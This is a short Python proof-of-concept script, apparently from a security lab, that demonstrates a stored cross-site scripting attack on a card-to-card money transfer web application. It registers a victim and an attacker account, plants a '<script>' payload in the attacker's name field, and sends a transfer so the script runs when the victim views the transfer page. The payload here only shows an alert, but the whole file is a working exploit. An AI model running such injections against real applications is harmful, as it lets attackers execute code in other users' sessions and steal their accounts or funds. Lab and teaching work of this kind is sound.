#! /usr/bin/env python3

from const import *

# Simple script for demonstration.
script = "<script>alert('ATTACK!')</script>"

victim = User("victim1", "12345678")
attacker = User("attacker1", "12345678")

# The transfer flow is attacker -> victim.
dst = victim.cardregister()["card_number"]
src = attacker.cardregister()["card_number"]

# Inject the script in sname field.
attacker.set_name("Attacker", script)

# Execute the attack.
attacker.transfer(src, dst, "1", "ATTACK!")

print("""
Now open a browser, log in as {}, password {}
and go to {}/card2card check out the attack.
""".format(victim.name, victim.pwd, url))